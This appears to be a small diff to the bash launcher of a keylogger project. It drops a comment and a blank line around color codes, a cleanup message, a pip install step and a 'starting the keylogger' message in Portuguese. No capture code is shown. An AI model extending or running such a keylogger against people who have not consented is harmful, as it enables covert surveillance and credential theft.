@@ -2,7 +2,7 @@
 
 GREEN='\033[0;32m'
 RED='\033[0;31m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
 cleanup() {
     echo -e "\n${GREEN}Keylogger finalizado com sucesso!${NC}"
@@ -17,7 +17,6 @@ fi
 
 echo "Verificando dependências..."
 pip3 install -r requirements.txt
-
 clear
 
 echo -e "${GREEN}Iniciando o Keylogger...${NC}"
